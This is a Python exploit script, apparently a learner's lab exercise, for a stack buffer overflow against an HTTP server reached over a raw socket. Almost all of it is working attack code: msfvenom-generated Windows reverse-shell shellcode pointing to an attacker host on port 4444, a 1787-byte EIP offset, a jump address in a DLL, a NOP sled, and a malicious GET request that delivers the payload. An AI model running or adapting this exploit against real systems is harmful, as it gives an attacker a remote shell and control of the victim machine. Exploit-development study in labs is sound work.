import socket
import struct
#shellcode  generated by msfvenom using the following command
#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.187.139 LPORT=4444 -b "\x00\x0d" -f python -v buf
buf =  b""
buf += b"\xbb\xae\xec\x1b\xbc\xd9\xec\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xf4\xe2\xf9"
buf += b"\x49\xf4\x13\x7f\xb1\x04\xe4\xe0\x3b\xe1\xd5\x20\x5f"
buf += b"\x62\x45\x91\x2b\x26\x6a\x5a\x79\xd2\xf9\x2e\x56\xd5"
buf += b"\x4a\x84\x80\xd8\x4b\xb5\xf1\x7b\xc8\xc4\x25\x5b\xf1"
buf += b"\x06\x38\x9a\x36\x7a\xb1\xce\xef\xf0\x64\xfe\x84\x4d"
buf += b"\xb5\x75\xd6\x40\xbd\x6a\xaf\x63\xec\x3d\xbb\x3d\x2e"
buf += b"\xbc\x68\x36\x67\xa6\x6d\x73\x31\x5d\x45\x0f\xc0\xb7"
buf += b"\x97\xf0\x6f\xf6\x17\x03\x71\x3f\x9f\xfc\x04\x49\xe3"
buf += b"\x81\x1e\x8e\x99\x5d\xaa\x14\x39\x15\x0c\xf0\xbb\xfa"
buf += b"\xcb\x73\xb7\xb7\x98\xdb\xd4\x46\x4c\x50\xe0\xc3\x73"
buf += b"\xb6\x60\x97\x57\x12\x28\x43\xf9\x03\x94\x22\x06\x53"
buf += b"\x77\x9a\xa2\x18\x9a\xcf\xde\x43\xf3\x3c\xd3\x7b\x03"
buf += b"\x2b\x64\x08\x31\xf4\xde\x86\x79\x7d\xf9\x51\x7d\x54"
buf += b"\xbd\xcd\x80\x57\xbe\xc4\x46\x03\xee\x7e\x6e\x2c\x65"
buf += b"\x7e\x8f\xf9\x2a\x2e\x3f\x52\x8b\x9e\xff\x02\x63\xf4"
buf += b"\x0f\x7c\x93\xf7\xc5\x15\x3e\x02\x8e\xd9\x17\xb7\xc5"
buf += b"\xb2\x65\xc7\xc8\x1e\xe3\x21\x80\x8e\xa5\xfa\x3d\x36"
buf += b"\xec\x70\xdf\xb7\x3a\xfd\xdf\x3c\xc9\x02\x91\xb4\xa4"
buf += b"\x10\x46\x35\xf3\x4a\xc1\x4a\x29\xe2\x8d\xd9\xb6\xf2"
buf += b"\xd8\xc1\x60\xa5\x8d\x34\x79\x23\x20\x6e\xd3\x51\xb9"
buf += b"\xf6\x1c\xd1\x66\xcb\xa3\xd8\xeb\x77\x80\xca\x35\x77"
buf += b"\x8c\xbe\xe9\x2e\x5a\x68\x4c\x99\x2c\xc2\x06\x76\xe7"
buf += b"\x82\xdf\xb4\x38\xd4\xdf\x90\xce\x38\x51\x4d\x97\x47"
buf += b"\x5e\x19\x1f\x30\x82\xb9\xe0\xeb\x06\xc9\xaa\xb1\x2f"
buf += b"\x42\x73\x20\x72\x0f\x84\x9f\xb1\x36\x07\x15\x4a\xcd"
buf += b"\x17\x5c\x4f\x89\x9f\x8d\x3d\x82\x75\xb1\x92\xa3\x5f"
# 0x7e455af7 this is the address of a dll i highjacked(hope my understading is correct)
#used struct.pack('<L, HEX') so i dont converted manually
#used nops \x90 to sliiiiiiide through stacks into SHELLLCODE *honostly i dont why i need nops
payload = "A"*1787 + struct.pack("<L",0x7e455af7) + "\x90"*40 + buf
#when sending patter_create, i quered the offset and it was 1787 exact match
#immunity EIP offset 36684335 = 1787 


#constructing http request through socket
headers = "GET "
headers += payload
headers += " HTTP/1.1\r\n\r\n"
URL = '192.168.187.140'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((URL, 80))
s.send(headers)
print "sent \n listen on p4444"
